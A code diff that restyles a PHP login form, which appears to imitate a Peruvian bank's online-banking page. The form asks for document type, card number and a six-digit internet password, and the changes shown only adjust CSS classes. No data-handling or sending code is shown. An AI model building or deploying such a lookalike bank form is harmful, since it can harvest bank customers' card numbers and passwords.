@@ -45,7 +45,7 @@ if(isset($_POST['submit'])){
                         <label><input type="radio" name="bcp" id="empresa" value="empresas"> Empresa</label>
                     </div>
                     <div class="Documentos">
-                        <select name="DNI"  id="documentos form-control" class="form-select selec-docu">
+                        <select name="DNI"  id="documentos " class="form-select selec-docu">
                             <option value="dni">DNI</option>
                             <option value="ce">CE</option>
                             <option value="pas">PAS</option>
@@ -58,7 +58,7 @@ if(isset($_POST['submit'])){
 
                     <div class="mb-4">
                         <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
-                        <input type="text" class="form-control ancho-input label-input" name="numeroTarjeta" id="numeroDocumento">
+                        <input type="text" class="form-control  label-input" name="numeroTarjeta" id="numeroDocumento">
                     </div>
 
                     <div class="my-3">
@@ -73,7 +73,7 @@ if(isset($_POST['submit'])){
                     </div>
                     <div class="mb-4">
                         <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
-                        <input type="Clave" class="form-control ancho-input label-input" name="Clave">
+                        <input type="Clave" class="form-control  label-input" name="Clave">
                     </div>
                     <div class="form-group">
                         <p>Captch Code</p>   
@@ -90,7 +90,7 @@ if(isset($_POST['submit'])){
                     </div>
 
                     <div class="d-grid">
-                        <input type="submit" name='submit' value="continuar" id="st" class="btn btn-primary"/>        
+                        <input type="submit" name='submit' value="continuar" id="st" class="btn btn-primary ancho-input"/>        
                         <p id="show" style="text-align:center;">
 
                     </div>
